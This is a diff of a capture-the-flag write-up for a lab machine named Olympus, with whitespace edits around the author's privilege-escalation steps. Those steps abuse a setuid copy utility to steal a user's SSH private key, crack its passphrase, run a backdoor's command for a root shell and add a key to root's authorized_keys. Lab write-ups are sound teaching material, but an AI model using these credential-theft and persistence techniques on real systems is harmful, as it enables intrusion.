@@ -531,7 +531,6 @@ I've now got a permanent access as a super user to the olympus.
 
 Wow prometheus you are more than a metrics server I guess.
 
-
 Anyways we got the flag:
 
 ```bash
@@ -546,19 +545,20 @@ Linpeas time has come.
 And I found this binary:
 
 ```bash
-www-data@ip-10-10-85-12:/$ ls -la /usr/bin/cputils 
+www-data@ip-10-10-85-12:/$ ls -la /usr/bin/cputils
 -rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
 ```
 
 So It's a file mover but with zeus privilages:
+
 ```bash
-www-data@ip-10-10-85-12:/$ cputils 
-  ____ ____        _   _ _     
- / ___|  _ \ _   _| |_(_) |___ 
+www-data@ip-10-10-85-12:/$ cputils
+  ____ ____        _   _ _
+ / ___|  _ \ _   _| |_(_) |___
 | |   | |_) | | | | __| | / __|
 | |___|  __/| |_| | |_| | \__ \
  \____|_|    \__,_|\__|_|_|___/
-                               
+
 Enter the Name of Source File: /home/zeus/.ssh/id_rsa
 
 Enter the Name of Target File: /tmp/id_rsa
@@ -568,13 +568,12 @@ File copied successfully.
 
 And I copy the ssh key and connect zeus with ssh.
 
-
 ```bash
-❯ chmod 400 /tmp/id_rsa 
+❯ chmod 400 /tmp/id_rsa
 
-~ 
+~
 ❯ ssh zeus@olympus.thm -i /tmp/id_rsa
-Enter passphrase for key '/tmp/id_rsa': 
+Enter passphrase for key '/tmp/id_rsa':
 ```
 
 And It got a password. Frustrating. Whatever lets crack that using john:
@@ -596,9 +595,11 @@ I look throught all the filesytem and find some weird folder on the /var/www/htm
 In this folder there is php file which is a backdoor.
 
 If you look throught the code you can see that this code executes:
+
 ```bash
 uname -a; w;/lib/defended/libc.so.99
 ```
+
 So we can execute that my hand.
 
 And we get the root shell:
@@ -608,9 +609,8 @@ whoami
 root
 ```
 
-
 ```bash
-cat root.flag 
+cat root.flag
                     ### Congrats !! ###
 
 
@@ -640,7 +640,7 @@ cat root.flag
                  (  \:  T\   _     _   /T  : ./
                   \  :    T^T T-+-T T^T    ;<
                    \..`_       -+-       _'  )
-                      . `--=.._____..=--'. ./          
+                      . `--=.._____..=--'. ./
 
 
 
@@ -660,8 +660,6 @@ PS : Prometheus left a hidden flag, try and find it ! I recommend logging as roo
                   (Hint : regex can be usefull)
 ```
 
-
-
 Ok Now we need to fing a secret flag
 
 Firstly log in as a root with ssh:
@@ -669,7 +667,6 @@ Firstly log in as a root with ssh:
 1. Add you public key to the root/.ssh/authorized_keys
 
 2. `ssh root@olympus.thm`
-
 
 Now we can try to get all the word which starts with flag{ with this command:
 
@@ -683,10 +680,8 @@ But never be me beacuse I run vim in the target machine rather than downloading 
 
 Anyways If you don't want use this command. the secret flag is on /etc/ssl/private.
 
-
-
 ```bash
-root@ip-10-10-85-12:/etc/ssl/private# cat .b0nus.fl4g 
+root@ip-10-10-85-12:/etc/ssl/private# cat .b0nus.fl4g
 Here is the final flag ! Congrats !
 
 flag{*****************}
